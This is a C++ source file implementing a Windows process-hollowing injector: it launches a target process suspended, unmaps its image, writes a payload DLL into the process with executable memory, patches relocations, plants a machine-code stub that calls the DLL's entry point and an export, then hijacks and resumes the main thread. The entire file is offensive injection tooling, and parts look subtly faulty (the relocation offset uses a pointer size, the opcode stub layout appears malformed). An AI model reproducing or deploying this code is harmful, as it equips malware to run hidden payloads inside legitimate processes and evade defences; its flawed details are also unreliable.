#include "tools.h"
#include <winternl.h>

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD ConvertVirtualAddressToRawAddress(DWORD virtual_address, LPVOID file) {
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) file;
	PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD)file + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

	while (virtual_address > section->VirtualAddress + section->Misc.VirtualSize) 
		section++;

	DWORD offset = virtual_address - section->VirtualAddress;
	DWORD raw_address = offset + section->PointerToRawData;
	return raw_address;
}

int Tools::AutoInject(LPSTR target, LPCSTR payload) {
	LPSTARTUPINFOA startup_info = new STARTUPINFOA();
	LPPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION *process_basic_info = new PROCESS_BASIC_INFORMATION();

	BOOL process_created = CreateProcessA(NULL, target, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startup_info, process_info);
	if (process_created == TRUE) {
		HANDLE target_process = process_info->hProcess;
		if (target_process != INVALID_HANDLE_VALUE) {
			DWORD return_lenght = 0;
			NtQueryInformationProcess(target_process, ProcessBasicInformation, process_basic_info, sizeof(PROCESS_BASIC_INFORMATION), &return_lenght);
			DWORD image_base_offset = (DWORD)process_basic_info->PebBaseAddress + 8;

			LPVOID destination_image_base = 0;
			SIZE_T bytes_read = NULL;
			BOOL process_read = ReadProcessMemory(target_process, (LPCVOID)image_base_offset, &destination_image_base, 4, &bytes_read);

			if (process_read == TRUE && destination_image_base != ERROR) {
				HANDLE dll_file = CreateFileA(payload, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
				if (dll_file != INVALID_HANDLE_VALUE) {
					DWORD dll_size = GetFileSize(dll_file, NULL);
					LPDWORD file_bytes_read = 0;
					LPVOID dll_buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);
					if (dll_buffer != ERROR) {
						DWORD ss = 0;
						BOOL dll_read = ReadFile(dll_file, dll_buffer, dll_size, &ss, NULL);

						if (dll_read == TRUE) {

							PIMAGE_DOS_HEADER dll_image_dos_header = (PIMAGE_DOS_HEADER)dll_buffer;
							PIMAGE_NT_HEADERS dll_image_nt_headers = (PIMAGE_NT_HEADERS)((DWORD)dll_buffer + dll_image_dos_header->e_lfanew);
							SIZE_T dll_image_size = dll_image_nt_headers->OptionalHeader.SizeOfImage;

							NtUnmapViewOfSection unmap_section = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
							if (NT_SUCCESS(unmap_section(target_process, destination_image_base))) {
								LPVOID new_destination_image_base = VirtualAllocEx(target_process, destination_image_base, dll_image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
								destination_image_base = new_destination_image_base;

								DWORD delta_image_base = (DWORD)destination_image_base - dll_image_nt_headers->OptionalHeader.ImageBase;

								dll_image_nt_headers->OptionalHeader.ImageBase = (DWORD)destination_image_base;
								WriteProcessMemory(target_process, new_destination_image_base, dll_buffer, dll_image_nt_headers->OptionalHeader.SizeOfHeaders, NULL);

								PIMAGE_SECTION_HEADER dll_image_section_header = (PIMAGE_SECTION_HEADER)((DWORD)dll_buffer + dll_image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
								PIMAGE_SECTION_HEADER old_dll_section_header = dll_image_section_header;

								for (int i = 0; i < dll_image_nt_headers->FileHeader.NumberOfSections; i++) {
									PVOID destination_section_location = (PVOID)((DWORD)destination_image_base + dll_image_section_header->VirtualAddress);
									PVOID source_section_location = (PVOID)((DWORD)dll_buffer + dll_image_section_header->PointerToRawData);
									WriteProcessMemory(target_process, destination_section_location, source_section_location, dll_image_section_header->SizeOfRawData, NULL);
									dll_image_section_header++;
								}

								// get FunEntry from exported function address
								PIMAGE_EXPORT_DIRECTORY image_export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)dll_buffer + ConvertVirtualAddressToRawAddress((DWORD)dll_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dll_buffer));
								PDWORD pEAT = (DWORD*)((DWORD)dll_buffer + ConvertVirtualAddressToRawAddress(image_export_directory->AddressOfFunctions, dll_buffer));

								//pEAT[0] - 1st exported function
								//pEAT[1] - 2nd exported function

								IMAGE_DATA_DIRECTORY relocation_table = dll_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
								dll_image_section_header = old_dll_section_header;

								for (int x = 0; x < dll_image_nt_headers->FileHeader.NumberOfSections; x++) {
									BYTE* reloc_section_name = (BYTE*)".reloc";
									if (memcmp(dll_image_section_header->Name, reloc_section_name, 5) != 0) {
										dll_image_section_header++;
										continue;
									}

									DWORD source_relocation_table_raw = dll_image_section_header->PointerToRawData;
									DWORD relocation_offset = 0;

									while (relocation_offset < relocation_table.Size) {
										PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)((DWORD)dll_buffer + source_relocation_table_raw + relocation_offset);
										relocation_offset += sizeof(PBASE_RELOCATION_BLOCK);
										DWORD relocation_counts = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
										PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)((DWORD)dll_buffer + source_relocation_table_raw + relocation_offset);

										for (DWORD a = 0; a < relocation_counts; a++) {
											relocation_offset += sizeof(BASE_RELOCATION_ENTRY);
											if (relocation_entries[a].Type == 0)
												continue;

											DWORD patched_address = relocation_block->PageAddress + relocation_entries[a].Offset;
											DWORD patched_buffer = 0;
											DWORD bytes_read = 0;

											ReadProcessMemory(target_process, (LPCVOID)((DWORD)destination_image_base + patched_address), &patched_buffer, sizeof(DWORD), &bytes_read);
											patched_buffer += delta_image_base;
											WriteProcessMemory(target_process, (PVOID)((DWORD)destination_image_base + patched_address), &patched_buffer, sizeof(DWORD), file_bytes_read);
										}
									}
								}

								LPCONTEXT context = new CONTEXT();
								context->ContextFlags = CONTEXT_INTEGER;
								GetThreadContext(process_info->hThread, context);

								// machine code -> opcodes
								// code for exec DllMain when injected
								BYTE code[] = {
									0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,
									0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,
									0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,
									0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,
									0xB8, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,
									0xFF, 0xE0 // jmp eax
								};

								*((PDWORD)(code + 1)) = 0; // 3rd param
								*((PDWORD)(code + 6)) = 1; // 2nd param
								*((PDWORD)(code + 11)) = (DWORD)destination_image_base; // 1st param
								*((PDWORD)(code + 16)) = (DWORD)destination_image_base + pEAT[1];
								*((PDWORD)(code + 21)) = (DWORD)destination_image_base + dll_image_nt_headers->OptionalHeader.AddressOfEntryPoint;

								LPVOID address_buffer = VirtualAllocEx(target_process, NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
								BOOL success = WriteProcessMemory(target_process, address_buffer, code, sizeof(code), NULL);

								if (success == TRUE) {
									context->Eax = (DWORD)address_buffer;
									SetThreadContext(process_info->hThread, context);
									ResumeThread(process_info->hThread);
								}
								return 0;
							}
						}
					}
				}
				CloseHandle(dll_file);
			}
		}
		CloseHandle(target_process);
	}
}